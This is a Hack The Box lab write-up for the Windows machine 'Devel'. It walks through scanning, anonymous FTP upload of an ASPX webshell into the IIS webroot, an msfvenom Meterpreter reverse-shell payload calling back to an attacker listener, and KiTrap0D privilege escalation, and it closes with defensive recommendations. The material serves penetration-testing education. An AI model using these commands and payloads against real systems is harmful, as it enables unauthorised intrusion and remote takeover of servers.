# HTB - Devel

**IP Address:** `10.10.10.5`  
**OS:** Windows 7 / IIS 7.5  
**Difficulty:** Easy  
**Tags:** #FTP, #IIS, #ASPX, #Metasploit, #KiTrap0D, #PrivilegeEscalation

---
## Synopsis

Devel is an easy Windows machine that demonstrates how an exposed FTP server combined with a misconfigured IIS web application can be leveraged to upload a webshell and gain remote code execution. Privilege escalation is achieved using the **KiTrap0D** exploit (MS10-015).

---
## Skills Required

- Basic FTP usage
- Understanding of webshells and reverse shells
- Familiarity with Metasploit modules

## Skills Learned

- Exploiting IIS through file upload via FTP
- Establishing a Meterpreter session from an uploaded ASPX shell
- Using Metasploit local privilege escalation exploits (KiTrap0D)

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.10.10.5
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/ping.png)

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

Scan all TCP ports to identify running services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.5 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/allports.png)

Extract open ports:

```bash
extractPorts allPorts
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/extractports.png)

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -p21,80 -sC -sV 10.10.10.5 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/targeted.png)

**Findings:**

| Port | Service | Version/Description |
|------|---------|---------------------|
| 21   | FTP     | Microsoft ftpd, anonymous login enabled |
| 80   | HTTP    | Microsoft IIS httpd 7.5 |

---
## 2. Exploitation

### 2.1 FTP Access

The FTP service is open, so we attempt to log in using `anonymous` credentials with an email as password:

```bash
ftp 10.10.10.5
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/ftp.png)

We successfully log in and can list resources. To check if file uploads are allowed, we create and upload a test file:

```bash
put test.txt
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/ftp_upload_test.png)

The file uploads successfully, confirming we can place files in the webroot.

---
### 2.2 Uploading a Webshell

We upload the default ASPX webshell from Kali:

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx .
ftp 10.10.10.5
put cmdasp.aspx
whoami
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/ftp_upload_shell.png)

We obtain remote command execution as user `iis apppool\web`.

---
### 2.3 System Enumeration

Check system details:

```bash
systeminfo
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/webshell_sysinfo.png)

List users:

```bash
dir C:\Users
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/webshell_users.png)

Check contents of `babis`:

```bash
dir C:\Users\babis
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/webshell_babis.png)

No useful information found.

---
### 2.4 Reverse Shell with Metasploit

We generate a reverse ASPX payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=443 -f aspx -a x86 > reverse.aspx
```

Upload the file via FTP:

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/metasploit_aspx_webshell.png)

Set up a listener with Metasploit:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.2
set lport 443
run
```

Trigger the reverse shell by browsing to the uploaded payload:

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/webshell_url.png)

Shell obtained:

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/shell_obtained.png)

Verify:

```bash
sysinfo
whoami /priv
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/shell_info.png)

---
## 3. Privilege Escalation

We background the session:

```bash
exit
background
```

Search for privilege escalation exploits:

```bash
search exploit/windows/local/ms10_015
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/exploit_kitrap0d.png)

Select and configure **KiTrap0D**. Exectue the shell in background session:

```bash
use 0
set lhost 10.10.14.2
set lport 443
set session 1
exploit
```

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/exploit_run.png)

We escalate successfully to Administrator:

![](GitHubv2/HackTheBox/EASY/Devel/screenshots/root_user_flag.png)

---
## 4. Post-Exploitation

Retrieve the flags:

- User flag from `C:\Users\babis\Desktop`
- Root flag from `C:\Users\Administrator\Desktop`

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **FTP Anonymous Login** → Gained access to upload files into the webroot.  
2. **Webshell Upload** → Obtained RCE as `iis apppool\web`.  
3. **Metasploit Reverse Shell** → Established a stable Meterpreter session.  
4. **KiTrap0D Exploit (MS10-015)** → Escalated privileges to Administrator.  

---
## Defensive Recommendations

- Disable **anonymous FTP access** or restrict it outside the IIS webroot.  
- Regularly patch Windows hosts to mitigate known local privilege escalation vulnerabilities (MS10-015).  
- Apply least privilege principles to application pools and restrict write permissions.  
